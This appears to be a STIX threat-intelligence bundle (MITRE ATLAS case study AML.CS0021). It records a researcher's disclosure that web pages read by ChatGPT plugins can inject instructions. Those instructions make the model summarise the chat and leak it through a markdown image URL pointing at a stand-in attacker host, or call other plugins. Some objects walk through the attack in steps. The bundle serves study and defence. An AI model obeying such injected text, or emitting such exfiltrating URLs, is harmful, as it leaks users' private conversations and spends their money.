@@ -1,0 +1,676 @@
+{
+    "type": "bundle",
+    "id": "bundle--1ff0c19d-2fec-4587-838a-bc8d21e31d86",
+    "objects": [
+        {
+            "id": "identity--b2c6f661-b8b8-58ed-af52-fc9ff9f2c8f3",
+            "spec_version": "2.1",
+            "identity_class": "individual",
+            "name": "Wnderwuzzi",
+            "created": "2023-12-06T15:54:33.313Z",
+            "modified": "2023-12-06T15:54:33.380Z",
+            "x_opencti_id": "a023cbf5-7d77-489b-8d38-945a91c8d019",
+            "x_opencti_type": "Individual",
+            "type": "identity"
+        },
+        {
+            "type": "marking-definition",
+            "spec_version": "2.1",
+            "id": "marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9",
+            "created": "2017-01-20T00:00:00.000Z",
+            "definition_type": "tlp",
+            "name": "TLP:CLEAR",
+            "definition": {
+                "tlp": "clear"
+            }
+        },
+        {
+            "id": "report--d8bc5a30-cb37-52e6-b0f8-3ca11a5e36af",
+            "spec_version": "2.1",
+            "revoked": false,
+            "x_opencti_reliability": "A - Completely reliable",
+            "confidence": 75,
+            "created": "2023-05-16T11:00:00.000Z",
+            "modified": "2024-05-14T16:03:40.676Z",
+            "name": "ChatGPT Plugins: Data Exfiltration via Images & Cross Plugin Request Forgery",
+            "description": "ChatGPT Plugins: Data Exfiltration via Images & Cross Plugin Request Forgery\nPosted on May 16, 2023#aiml #machine learning #red #threats #ai injections #chatgpt\nThis post shows how a malicious website can take control of a ChatGPT chat session and exfiltrate the history of the conversation.\n\nPlugins, Tools and Integrations\nWith plugins, data exfiltration can happen by sending too much data into the plugin in the first place. More security controls and insights on what is being sent to the plugin are required to empower users.\n\nHowever, this post is not about sending too much data to a plugin, but about a ```malicious actor who controls the data a plugin retrieves (AML.T0051.001)```.\n\nUntrusted Data and Markdown Injection\nThe individual controlling the data a plugin retrieves can exfiltrate chat history due to ChatGPT\u2019s rendering of markdown images.\n\nBasically, if the LLM returns a markdown image in the form of\n\n![data exfiltration in progress](https://attacker/q=*exfil_data*)\nChatGPT will render it automatically and retrieve the URL. During an Indirect Prompt Injection the adversary controls what the LLM is doing (I call it AI Injection for a reason), and it can ask to summarize the past history of the chat and append it to the URL to exfiltrate the data.\n\nI\u2019m not the only one who points this out, Roman Samoilenko has observed and posted about this vulnerability in ChatGPT before. Roman found it end of March, and I ran across it independently a few days later in early April.\n\nProof of Concept Demonstration\nThis is possible with plugins, e.g. via the WebPilot Plugin or check out the YouTube Transcript Plugin Injection I posted about the other day.\n\nThe LLM\u2019s response can contain markdown (or instruct the AI to build it on the fly), summarize the past conversation, URL encode that summary and append that as query parameter. And off it goes to the attacker.\n\nHere is how this looks in action:\n\nData exfiltration in progress\n\nThe text that is being exfiltrated including \u201cTooManySecrets123\u201d is something that was written earlier in the chat conversation.\n\nAnd here is an end to end video POC:\n\n\nFeel free to skip forward in the middle section - it\u2019s a bit slow.\n\nBut wait, there is more\u2026.\n\nCan an attacker call another Plugin during the injection?\nShort answer is yes.\n\nThis is an interesting variant of Cross Site Request Forgery actually, but we will need a new name for it, maybe Cross Plugin Request Forgery.\n\nHere is an example of an Indirect Prompt Injection calling another plugin (Expedia) to look for flights:\n\nAI Injections searches for flights\n\nYes, random webpages and comments on sites will soon hijack your AI and spend your money.\n\nMitigations and Suggestions\nSafe AI assistants would be really awesome to have, the power of ChatGPT is amazing! So what could be done to improve the security posture?\n\nIts unclear why plugins have access to the entire conversation context. This could be isolated. It would be better if plugins go off do their work, rather then giving it access to the entire conversation history, or allow invoking other plugins.\nA security contract for plugins is needed. Who is responsible for what? What data is sent to the plugin? Currently there is no defined or enforced schema that could help mitigate such problems. Open AI mentions Human in the loop as a core safety best practice, but end-users have little to no control at the moment once they start using plugins.\nIn fact the idea of having some sort of kernel LLM and other sandbox LLM is discussed by Simon Willison, who has thought about this already in a lot more detail.\nNVIDIA has been working on NeMo GuardRails to help keep bots in check\nScenarios like rendering images could be implemented as a dedicated feature, rather than depending on the convenience of markdown. (e.g. links being returned that are not injected into the chat context, but as references after the main message).\nOnly use and point plugins to data you fully trust.\nA lot more research is needed, both from offensive and defensive side. And at this point, with the speed of adoption and new tools being released it seems that raising awareness to have more smart people look into this (and how to fix it) is the best we can do.\n\nConclusion\nWith the advent of plugins Indirect Prompt Injections are now a reality within ChatGPT\u2019s ecosystem. As attacks evolve we will probably learn and see nefarious text and instructions on websites, blog posts, comments,.. to attempt to take control of your AI.\n\nResponsible Disclosure\nI first disclosed the image markdown injection issue to Open AI on April, 9th 2023.\n\nAfter some back and forth, and highlighting that plugins will allow to exploit this remotely, I was informed that image markdown injection is a feature and that no changes are planned to mitigate this vulnerability.\n\nReferences\nRoman Samoilenko - New prompt injection attack on ChatGPT web version. Markdown images can steal your chat data.\nOpen AI Safety Best Practices\nDual LLM pattern\nNeMo GuardRails",
+            "report_types": [
+                "threat-report"
+            ],
+            "published": "2023-05-16T11:00:00.000Z",
+            "labels": [
+                "aml.cs0021",
+                "mitre atlas source",
+                "ml-ready"
+            ],
+            "external_references": [
+                {
+                    "source_name": "AML.CS0021",
+                    "url": "https://github.com/mitre-atlas/atlas-navigator-data/blob/main/dist/case-study-navigator-layers/AML.CS0021.json"
+                },
+                {
+                    "source_name": "Embrace the Red",
+                    "url": "https://embracethered.com/blog/posts/2023/chatgpt-webpilot-data-exfil-via-markdown-injection/"
+                }
+            ],
+            "x_opencti_id": "cbc66474-f5f1-420c-aac7-b13a0d8b3d4c",
+            "x_opencti_type": "Report",
+            "type": "report",
+            "created_by_ref": "identity--b2c6f661-b8b8-58ed-af52-fc9ff9f2c8f3",
+            "object_marking_refs": [
+                "marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9"
+            ],
+            "object_refs": [
+                "relationship--0441cc57-fdb3-4429-b9a0-132d2a4503c9",
+                "relationship--7e947fc2-757d-4b53-8496-5602119a85b9",
+                "relationship--d6416b1a-f3c7-472f-85fa-81eac5ce1fe4",
+                "relationship--3cd7c5a2-8169-44ff-8b0d-2829c7fdd68a",
+                "relationship--e8c9d2d4-e86a-4b03-a643-f8681c732a7f",
+                "relationship--ad0566d1-214e-4f54-b06b-781ff0304d5c",
+                "relationship--8f4d1f3a-1304-4ca6-8ba0-3f891832ed08",
+                "relationship--d9e9fdd7-9fe1-4450-8516-89b5b31b630b",
+                "relationship--cb1b9c95-33f8-4645-b056-672d1f2eeda0",
+                "relationship--444cacaa-bfab-4765-b4cc-de0522b1f962",
+                "incident--b5f7051f-af53-50c2-84b4-2d2ceff55ac6",
+                "attack-pattern--752cc928-0225-55d8-8f88-d6682dc8bc34",
+                "attack-pattern--e4ea4abb-11ae-55b0-83a9-3ced07e2b79c",
+                "attack-pattern--90211ab3-7ed3-5f2b-82d2-ad4fe3c9c897",
+                "attack-pattern--ab29b7a5-be70-5798-aeea-75c94c3fa8be",
+                "attack-pattern--a616f41c-b06a-5163-bf53-a0e8b5710e2d",
+                "attack-pattern--8efdfe79-f360-5fb8-bbfc-7de4696ccffd",
+                "infrastructure--0b2924ae-cc2f-57c2-817e-99a6614a0734",
+                "vulnerability--0f35d8e4-9a54-591c-a9f5-577ac1e7f652",
+                "vulnerability--36788e0c-7a4b-5e34-a894-5977650748a2"
+            ]
+        },
+        {
+            "id": "relationship--0441cc57-fdb3-4429-b9a0-132d2a4503c9",
+            "spec_version": "2.1",
+            "relationship_type": "has",
+            "start_time": "2023-05-16T04:00:00.000Z",
+            "stop_time": "2023-05-16T04:00:00.000Z",
+            "revoked": false,
+            "confidence": 75,
+            "lang": "en",
+            "created": "2024-05-14T15:53:54.659Z",
+            "modified": "2024-05-14T15:53:54.721Z",
+            "x_opencti_id": "bc2ace7b-0e06-4f92-a837-7731089f287b",
+            "x_opencti_type": "has",
+            "type": "relationship",
+            "created_by_ref": "identity--b2c6f661-b8b8-58ed-af52-fc9ff9f2c8f3",
+            "object_marking_refs": [
+                "marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9"
+            ],
+            "source_ref": "infrastructure--0b2924ae-cc2f-57c2-817e-99a6614a0734",
+            "target_ref": "vulnerability--36788e0c-7a4b-5e34-a894-5977650748a2"
+        },
+        {
+            "id": "relationship--7e947fc2-757d-4b53-8496-5602119a85b9",
+            "spec_version": "2.1",
+            "relationship_type": "has",
+            "start_time": "2023-05-16T04:00:00.000Z",
+            "stop_time": "2023-05-16T04:00:00.000Z",
+            "revoked": false,
+            "confidence": 75,
+            "lang": "en",
+            "created": "2024-05-14T15:53:52.289Z",
+            "modified": "2024-05-14T15:53:52.382Z",
+            "x_opencti_id": "83ddbe8e-ab3a-4379-ba78-8f6ffdce593e",
+            "x_opencti_type": "has",
+            "type": "relationship",
+            "created_by_ref": "identity--b2c6f661-b8b8-58ed-af52-fc9ff9f2c8f3",
+            "object_marking_refs": [
+                "marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9"
+            ],
+            "source_ref": "infrastructure--0b2924ae-cc2f-57c2-817e-99a6614a0734",
+            "target_ref": "vulnerability--0f35d8e4-9a54-591c-a9f5-577ac1e7f652"
+        },
+        {
+            "id": "relationship--d6416b1a-f3c7-472f-85fa-81eac5ce1fe4",
+            "spec_version": "2.1",
+            "relationship_type": "related-to",
+            "start_time": "2023-05-16T04:00:00.000Z",
+            "stop_time": "2023-05-16T04:00:00.000Z",
+            "revoked": false,
+            "confidence": 75,
+            "lang": "en",
+            "created": "2024-05-14T15:53:18.187Z",
+            "modified": "2024-05-14T15:53:18.276Z",
+            "x_opencti_id": "28c45a8b-ac5e-4fc3-be3f-94d82ff4a096",
+            "x_opencti_type": "related-to",
+            "type": "relationship",
+            "created_by_ref": "identity--b2c6f661-b8b8-58ed-af52-fc9ff9f2c8f3",
+            "object_marking_refs": [
+                "marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9"
+            ],
+            "source_ref": "infrastructure--0b2924ae-cc2f-57c2-817e-99a6614a0734",
+            "target_ref": "attack-pattern--90211ab3-7ed3-5f2b-82d2-ad4fe3c9c897"
+        },
+        {
+            "id": "relationship--3cd7c5a2-8169-44ff-8b0d-2829c7fdd68a",
+            "spec_version": "2.1",
+            "relationship_type": "uses",
+            "description": "The attacker was exploits a ChatGPT plugin designed to access a URL provided by the user, which is designed to process the plain text found within the web page for information retrieval.",
+            "start_time": "2023-05-16T04:00:00.000Z",
+            "stop_time": "2023-05-16T04:00:00.000Z",
+            "revoked": false,
+            "confidence": 75,
+            "lang": "en",
+            "created": "2024-05-14T15:52:55.828Z",
+            "modified": "2024-05-14T15:57:42.830Z",
+            "x_opencti_id": "fddf58fd-6334-4c57-b024-900383841c15",
+            "x_opencti_type": "uses",
+            "type": "relationship",
+            "created_by_ref": "identity--b2c6f661-b8b8-58ed-af52-fc9ff9f2c8f3",
+            "object_marking_refs": [
+                "marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9"
+            ],
+            "source_ref": "incident--b5f7051f-af53-50c2-84b4-2d2ceff55ac6",
+            "target_ref": "infrastructure--0b2924ae-cc2f-57c2-817e-99a6614a0734"
+        },
+        {
+            "id": "relationship--e8c9d2d4-e86a-4b03-a643-f8681c732a7f",
+            "spec_version": "2.1",
+            "relationship_type": "uses",
+            "description": "Step 6\n\nWith the user's chat history leaked to the attacker, the user is now vulnerable to several potential consequences, such as PII exposure.",
+            "start_time": "2023-05-16T04:00:00.000Z",
+            "stop_time": "2023-05-16T04:00:00.000Z",
+            "revoked": false,
+            "confidence": 75,
+            "lang": "en",
+            "created": "2023-12-06T19:18:58.857Z",
+            "modified": "2024-05-14T15:56:04.893Z",
+            "x_opencti_id": "f1274c5c-8be0-4634-8610-1bf2641cddcb",
+            "x_opencti_type": "uses",
+            "type": "relationship",
+            "created_by_ref": "identity--b2c6f661-b8b8-58ed-af52-fc9ff9f2c8f3",
+            "object_marking_refs": [
+                "marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9"
+            ],
+            "source_ref": "incident--b5f7051f-af53-50c2-84b4-2d2ceff55ac6",
+            "target_ref": "attack-pattern--a616f41c-b06a-5163-bf53-a0e8b5710e2d"
+        },
+        {
+            "id": "relationship--ad0566d1-214e-4f54-b06b-781ff0304d5c",
+            "spec_version": "2.1",
+            "relationship_type": "uses",
+            "description": "Step 5\n\nWhen the plugin accesses this malicious website, the indirect prompt injection attack instructs the LLM to summarize the past history of the user's chat and append it to the URL to exfiltrate further at a later time.",
+            "start_time": "2023-05-16T04:00:00.000Z",
+            "stop_time": "2023-05-16T04:00:00.000Z",
+            "revoked": false,
+            "confidence": 75,
+            "lang": "en",
+            "created": "2023-12-06T19:17:59.636Z",
+            "modified": "2024-05-14T15:55:17.944Z",
+            "x_opencti_id": "c2ec357b-94b8-4e7a-8d65-4dfdf0107faa",
+            "x_opencti_type": "uses",
+            "type": "relationship",
+            "created_by_ref": "identity--b2c6f661-b8b8-58ed-af52-fc9ff9f2c8f3",
+            "object_marking_refs": [
+                "marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9"
+            ],
+            "source_ref": "incident--b5f7051f-af53-50c2-84b4-2d2ceff55ac6",
+            "target_ref": "attack-pattern--752cc928-0225-55d8-8f88-d6682dc8bc34"
+        },
+        {
+            "id": "relationship--8f4d1f3a-1304-4ca6-8ba0-3f891832ed08",
+            "spec_version": "2.1",
+            "relationship_type": "uses",
+            "description": "Step 4",
+            "start_time": "2023-05-16T04:00:00.000Z",
+            "stop_time": "2023-05-16T04:00:00.000Z",
+            "revoked": false,
+            "confidence": 75,
+            "lang": "en",
+            "created": "2023-12-06T19:17:19.004Z",
+            "modified": "2023-12-06T19:17:19.039Z",
+            "x_opencti_id": "72e003e7-0e68-4089-a61d-36775e091381",
+            "x_opencti_type": "uses",
+            "type": "relationship",
+            "created_by_ref": "identity--b2c6f661-b8b8-58ed-af52-fc9ff9f2c8f3",
+            "object_marking_refs": [
+                "marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9"
+            ],
+            "source_ref": "incident--b5f7051f-af53-50c2-84b4-2d2ceff55ac6",
+            "target_ref": "attack-pattern--90211ab3-7ed3-5f2b-82d2-ad4fe3c9c897"
+        },
+        {
+            "id": "relationship--d9e9fdd7-9fe1-4450-8516-89b5b31b630b",
+            "spec_version": "2.1",
+            "relationship_type": "uses",
+            "description": "Step 3\n\nIn this use case, the attacker was exploiting a ChatGPT plugin designed to access a URL provided by the user, which is designed to process the plain text found within the web page for information retrieval.",
+            "start_time": "2023-05-16T04:00:00.000Z",
+            "stop_time": "2023-05-16T04:00:00.000Z",
+            "revoked": false,
+            "confidence": 75,
+            "lang": "en",
+            "created": "2023-12-06T19:12:12.803Z",
+            "modified": "2024-05-14T15:48:39.907Z",
+            "x_opencti_id": "ef68fa10-8b19-4894-9a38-a380f41c1539",
+            "x_opencti_type": "uses",
+            "type": "relationship",
+            "created_by_ref": "identity--b2c6f661-b8b8-58ed-af52-fc9ff9f2c8f3",
+            "object_marking_refs": [
+                "marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9"
+            ],
+            "source_ref": "incident--b5f7051f-af53-50c2-84b4-2d2ceff55ac6",
+            "target_ref": "attack-pattern--ab29b7a5-be70-5798-aeea-75c94c3fa8be"
+        },
+        {
+            "id": "relationship--cb1b9c95-33f8-4645-b056-672d1f2eeda0",
+            "spec_version": "2.1",
+            "relationship_type": "uses",
+            "description": "Step 2\n\nWhen the LLM is directed to access the malicious website during a chat session using the open-source plugin, it ingests the prompt injection attack designed by the adversary designed to change the LLM's behavior.",
+            "start_time": "2023-05-16T04:00:00.000Z",
+            "stop_time": "2023-05-16T04:00:00.000Z",
+            "revoked": false,
+            "confidence": 75,
+            "lang": "en",
+            "created": "2023-12-06T16:57:01.072Z",
+            "modified": "2024-05-14T15:48:00.801Z",
+            "x_opencti_id": "6e56dc8f-3f3f-4174-913b-0e5a623e0031",
+            "x_opencti_type": "uses",
+            "type": "relationship",
+            "created_by_ref": "identity--b2c6f661-b8b8-58ed-af52-fc9ff9f2c8f3",
+            "object_marking_refs": [
+                "marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9"
+            ],
+            "source_ref": "incident--b5f7051f-af53-50c2-84b4-2d2ceff55ac6",
+            "target_ref": "attack-pattern--e4ea4abb-11ae-55b0-83a9-3ced07e2b79c"
+        },
+        {
+            "id": "relationship--444cacaa-bfab-4765-b4cc-de0522b1f962",
+            "spec_version": "2.1",
+            "relationship_type": "uses",
+            "description": "Step 1\n\nAn attacker designed a malicious website-based prompt injection that can be executed when ChatGPT utilizes open-source plugins.",
+            "start_time": "2023-05-16T04:00:00.000Z",
+            "stop_time": "2023-05-16T04:00:00.000Z",
+            "revoked": false,
+            "confidence": 75,
+            "lang": "en",
+            "created": "2023-12-06T16:52:09.242Z",
+            "modified": "2024-05-14T15:47:39.930Z",
+            "x_opencti_id": "186df885-8871-48bf-92f8-c3b0eb06548f",
+            "x_opencti_type": "uses",
+            "type": "relationship",
+            "created_by_ref": "identity--b2c6f661-b8b8-58ed-af52-fc9ff9f2c8f3",
+            "object_marking_refs": [
+                "marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9"
+            ],
+            "source_ref": "incident--b5f7051f-af53-50c2-84b4-2d2ceff55ac6",
+            "target_ref": "attack-pattern--8efdfe79-f360-5fb8-bbfc-7de4696ccffd"
+        },
+        {
+            "id": "incident--b5f7051f-af53-50c2-84b4-2d2ceff55ac6",
+            "spec_version": "2.1",
+            "revoked": false,
+            "confidence": 75,
+            "created": "2023-12-06T16:29:51.198Z",
+            "modified": "2023-12-29T19:29:42.279Z",
+            "name": "2023 ChatGPT Plugin Privacy Leak",
+            "description": "Researchers uncovered an indirect prompt injection vulnerability within ChatGPT, where an attacker can feed malicious websites through ChatGPT plugins to take control of a chat session and exfiltrate the history of the conversation. As a result of this attack, users may be vulnerable to PII leakage from the extracted chat session.",
+            "incident_type": "research-finding",
+            "labels": [
+                "aml.cs0021"
+            ],
+            "x_opencti_id": "3ede82a2-364d-48d6-9169-e38e0c941230",
+            "x_opencti_type": "Incident",
+            "type": "incident",
+            "created_by_ref": "identity--b2c6f661-b8b8-58ed-af52-fc9ff9f2c8f3",
+            "object_marking_refs": [
+                "marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9"
+            ]
+        },
+        {
+            "type": "marking-definition",
+            "spec_version": "2.1",
+            "id": "marking-definition--c4099854-e00c-5dbc-b0fe-4c9909920101",
+            "created": "2017-06-01T00:00:00.000Z",
+            "definition_type": "statement",
+            "name": "Copyright 2015-2023, The MITRE Corporation. MITRE ATT&CK and ATT&CK are registered trademarks of The MITRE Corporation.",
+            "definition": {
+                "statement": "copyright 2015-2023, the mitre corporation. mitre att&ck and att&ck are registered trademarks of the mitre corporation."
+            }
+        },
+        {
+            "id": "attack-pattern--752cc928-0225-55d8-8f88-d6682dc8bc34",
+            "spec_version": "2.1",
+            "revoked": false,
+            "confidence": 0,
+            "created": "2023-10-31T13:48:07.639Z",
+            "modified": "2023-11-20T18:19:52.530Z",
+            "name": "LLM Data Leakage",
+            "description": "Adversaries may craft prompts that induce the LLM to leak sensitive information.\nThis can include private user data or proprietary information.\nThe leaked information may come from proprietary training data, data sources the LLM is connected to, or information from other users of the LLM.",
+            "x_mitre_id": "AML.T0057",
+            "labels": [
+                "atlas"
+            ],
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "mitre-atlas",
+                    "phase_name": "exfiltration",
+                    "x_opencti_order": 13
+                }
+            ],
+            "external_references": [
+                {
+                    "source_name": "mitre-atlas",
+                    "url": "https://atlas.mitre.org/techniques/AML.T0057",
+                    "external_id": "AML.T0057"
+                }
+            ],
+            "x_opencti_id": "1bed5d59-38f6-485e-ab5f-30a1c7ab2c89",
+            "x_opencti_type": "Attack-Pattern",
+            "type": "attack-pattern",
+            "object_marking_refs": [
+                "marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9",
+                "marking-definition--c4099854-e00c-5dbc-b0fe-4c9909920101"
+            ]
+        },
+        {
+            "id": "attack-pattern--e4ea4abb-11ae-55b0-83a9-3ced07e2b79c",
+            "spec_version": "2.1",
+            "revoked": false,
+            "confidence": 0,
+            "created": "2023-10-31T13:48:07.637Z",
+            "modified": "2023-11-20T18:19:52.421Z",
+            "name": "Indirect",
+            "description": "An adversary may inject prompts indirectly via separate data channel ingested by the LLM such as include text or multimedia pulled from databases or websites.\nThese malicious prompts may be hidden or obfuscated from the user. This type of injection may be used by the adversary to gain a foothold in the system or to target an unwitting user of the system.",
+            "x_mitre_id": "AML.T0051.001",
+            "labels": [
+                "atlas"
+            ],
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "mitre-atlas",
+                    "phase_name": "defense-evasion",
+                    "x_opencti_order": 8
+                },
+                {
+                    "kill_chain_name": "mitre-atlas",
+                    "phase_name": "initial-access",
+                    "x_opencti_order": 3
+                },
+                {
+                    "kill_chain_name": "mitre-atlas",
+                    "phase_name": "persistence",
+                    "x_opencti_order": 6
+                },
+                {
+                    "kill_chain_name": "mitre-atlas",
+                    "phase_name": "privilege-escalation",
+                    "x_opencti_order": 7
+                }
+            ],
+            "external_references": [
+                {
+                    "source_name": "mitre-atlas",
+                    "url": "https://atlas.mitre.org/techniques/AML.T0051.001",
+                    "external_id": "AML.T0051.001"
+                }
+            ],
+            "x_opencti_id": "96308251-4532-412a-a5bc-a3d7f9e089d9",
+            "x_opencti_type": "Attack-Pattern",
+            "type": "attack-pattern",
+            "object_marking_refs": [
+                "marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9",
+                "marking-definition--c4099854-e00c-5dbc-b0fe-4c9909920101"
+            ]
+        },
+        {
+            "id": "attack-pattern--90211ab3-7ed3-5f2b-82d2-ad4fe3c9c897",
+            "spec_version": "2.1",
+            "revoked": false,
+            "confidence": 0,
+            "created": "2023-10-31T13:48:07.638Z",
+            "modified": "2023-11-20T18:19:51.869Z",
+            "name": "LLM Plugin Compromise",
+            "description": "Adversaries may use their access to an LLM that is part of a larger system to compromise connected plugins.\nLLMs are often connected to other services or resources via plugins to increase their capabilities.\nPlugins may include integrations with other applications, access to public or private data sources, and the ability to execute code.\n\nThis may allow adversaries to execute API calls to integrated applications or plugins, providing the adversary with increased privileges on the system.\nAdversaries may take advantage of connected data sources to retrieve sensitive information.\nThey may also use an LLM integrated with a command or script interpreter to execute arbitrary instructions.",
+            "x_mitre_id": "AML.T0053",
+            "labels": [
+                "atlas"
+            ],
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "mitre-atlas",
+                    "phase_name": "execution",
+                    "x_opencti_order": 5
+                },
+                {
+                    "kill_chain_name": "mitre-atlas",
+                    "phase_name": "privilege-escalation",
+                    "x_opencti_order": 7
+                }
+            ],
+            "external_references": [
+                {
+                    "source_name": "mitre-atlas",
+                    "url": "https://atlas.mitre.org/techniques/AML.T0053",
+                    "external_id": "AML.T0053"
+                }
+            ],
+            "x_opencti_id": "be6ec68f-a978-4e08-96c9-3df10ac601ef",
+            "x_opencti_type": "Attack-Pattern",
+            "type": "attack-pattern",
+            "object_marking_refs": [
+                "marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9",
+                "marking-definition--c4099854-e00c-5dbc-b0fe-4c9909920101"
+            ]
+        },
+        {
+            "id": "attack-pattern--ab29b7a5-be70-5798-aeea-75c94c3fa8be",
+            "spec_version": "2.1",
+            "revoked": false,
+            "confidence": 0,
+            "created": "2023-10-31T13:48:07.637Z",
+            "modified": "2023-11-20T18:19:51.638Z",
+            "name": "LLM Prompt Injection",
+            "description": "An adversary may craft malicious prompts as inputs to an LLM that cause the LLM to act in unintended ways.\nThese \"prompt injections\" are often designed to cause the model to ignore aspects of its original instructions and follow the adversary's instructions instead.\n\nPrompt Injections can be an initial access vector to the LLM that provides the adversary with a foothold to carry out other steps in their operation.\nThey may be designed to bypass defenses in the LLM, or allow the adversary to issue privileged commands.\nThe effects of a prompt injection can persist throughout an interactive session with an LLM.\n\nMalicious prompts may be injected directly by the adversary ([Direct](/techniques/AML.T0051.000)) either to leverage the LLM to generate harmful content or to gain a foothold on the system and lead to further effects.\nPrompts may also be injected indirectly when as part of its normal operation the LLM ingests the malicious prompt from another data source ([Indirect](/techniques/AML.T0051.001)). This type of injection can be used by the adversary to a foothold on the system or to target the user of the LLM.",
+            "x_mitre_id": "AML.T0051",
+            "labels": [
+                "atlas"
+            ],
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "mitre-atlas",
+                    "phase_name": "defense-evasion",
+                    "x_opencti_order": 8
+                },
+                {
+                    "kill_chain_name": "mitre-atlas",
+                    "phase_name": "initial-access",
+                    "x_opencti_order": 3
+                },
+                {
+                    "kill_chain_name": "mitre-atlas",
+                    "phase_name": "persistence",
+                    "x_opencti_order": 6
+                },
+                {
+                    "kill_chain_name": "mitre-atlas",
+                    "phase_name": "privilege-escalation",
+                    "x_opencti_order": 7
+                }
+            ],
+            "external_references": [
+                {
+                    "source_name": "mitre-atlas",
+                    "url": "https://atlas.mitre.org/techniques/AML.T0051",
+                    "external_id": "AML.T0051"
+                }
+            ],
+            "x_opencti_id": "c4ac4d1a-3763-4a9c-92d6-286ad697b2db",
+            "x_opencti_type": "Attack-Pattern",
+            "type": "attack-pattern",
+            "object_marking_refs": [
+                "marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9",
+                "marking-definition--c4099854-e00c-5dbc-b0fe-4c9909920101"
+            ]
+        },
+        {
+            "id": "attack-pattern--a616f41c-b06a-5163-bf53-a0e8b5710e2d",
+            "spec_version": "2.1",
+            "revoked": false,
+            "confidence": 0,
+            "created": "2023-10-31T13:48:07.636Z",
+            "modified": "2023-11-20T18:19:50.307Z",
+            "name": "User Harm",
+            "description": "User harms may encompass a variety of harm types including financial and reputational that are directed at or felt by individual victims of the attack rather than at the organization level.",
+            "x_mitre_id": "AML.T0048.003",
+            "labels": [
+                "atlas"
+            ],
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "mitre-atlas",
+                    "phase_name": "impact",
+                    "x_opencti_order": 14
+                }
+            ],
+            "external_references": [
+                {
+                    "source_name": "mitre-atlas",
+                    "url": "https://atlas.mitre.org/techniques/AML.T0048.003",
+                    "external_id": "AML.T0048.003"
+                }
+            ],
+            "x_opencti_id": "f8e8790d-161e-4f98-a8da-99a85407277b",
+            "x_opencti_type": "Attack-Pattern",
+            "type": "attack-pattern",
+            "object_marking_refs": [
+                "marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9",
+                "marking-definition--c4099854-e00c-5dbc-b0fe-4c9909920101"
+            ]
+        },
+        {
+            "id": "attack-pattern--8efdfe79-f360-5fb8-bbfc-7de4696ccffd",
+            "spec_version": "2.1",
+            "revoked": false,
+            "confidence": 0,
+            "created": "2023-10-31T13:48:07.621Z",
+            "modified": "2023-11-20T18:19:38.955Z",
+            "name": "Develop Capabilities",
+            "description": "Adversaries may develop their own capabilities to support operations. This process encompasses identifying requirements, building solutions, and deploying capabilities. Capabilities used to support attacks on ML systems are not necessarily ML-based themselves. Examples include setting up websites with adversarial information or creating Jupyter notebooks with obfuscated exfiltration code.",
+            "x_mitre_id": "AML.T0017",
+            "labels": [
+                "atlas"
+            ],
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "mitre-atlas",
+                    "phase_name": "resource-development",
+                    "x_opencti_order": 2
+                }
+            ],
+            "external_references": [
+                {
+                    "source_name": "mitre-atlas",
+                    "url": "https://atlas.mitre.org/techniques/AML.T0017",
+                    "external_id": "AML.T0017"
+                }
+            ],
+            "x_opencti_id": "4510901c-b241-48f6-87d1-a4fedd632dca",
+            "x_opencti_type": "Attack-Pattern",
+            "type": "attack-pattern",
+            "object_marking_refs": [
+                "marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9",
+                "marking-definition--c4099854-e00c-5dbc-b0fe-4c9909920101"
+            ]
+        },
+        {
+            "id": "identity--e52b2fa3-2af0-5e53-ad38-17d54b3d61cb",
+            "spec_version": "2.1",
+            "identity_class": "organization",
+            "name": "AlienVault",
+            "created": "2022-02-04T17:41:13.134Z",
+            "modified": "2023-09-25T17:05:59.108Z",
+            "x_opencti_organization_type": "vendor",
+            "x_opencti_id": "a3385e06-17e7-4ec0-9946-fecb3cb1754a",
+            "x_opencti_type": "Organization",
+            "type": "identity"
+        },
+        {
+            "id": "infrastructure--0b2924ae-cc2f-57c2-817e-99a6614a0734",
+            "spec_version": "2.1",
+            "revoked": false,
+            "confidence": 75,
+            "created": "2023-06-19T17:24:35.603Z",
+            "modified": "2024-01-19T21:12:59.310Z",
+            "name": "ChatGPT",
+            "infrastructure_types": [
+                "software "
+            ],
+            "x_opencti_id": "b830ad6c-1e09-417a-8fa2-3f3bff9b2b35",
+            "x_opencti_type": "Infrastructure",
+            "type": "infrastructure",
+            "created_by_ref": "identity--e52b2fa3-2af0-5e53-ad38-17d54b3d61cb",
+            "object_marking_refs": [
+                "marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9"
+            ]
+        },
+        {
+            "id": "identity--f11b0831-e7e6-5214-9431-ccf054e53e94",
+            "spec_version": "2.1",
+            "identity_class": "organization",
+            "name": "The MITRE Corporation",
+            "created": "2022-03-19T14:31:54.175Z",
+            "modified": "2024-01-09T16:02:23.973Z",
+            "x_opencti_id": "aa947cdf-0dfc-4513-8885-130575dec9f4",
+            "x_opencti_type": "Organization",
+            "type": "identity"
+        },
+        {
+            "id": "vulnerability--0f35d8e4-9a54-591c-a9f5-577ac1e7f652",
+            "spec_version": "2.1",
+            "revoked": false,
+            "confidence": 15,
+            "created": "2023-03-08T14:10:24.165Z",
+            "modified": "2024-04-05T19:05:31.878Z",
+            "name": "[CWE-349] Acceptance of Extraneous Untrusted Data With Trusted Data",
+            "description": "nan",
+            "labels": [
+                "atlas"
+            ],
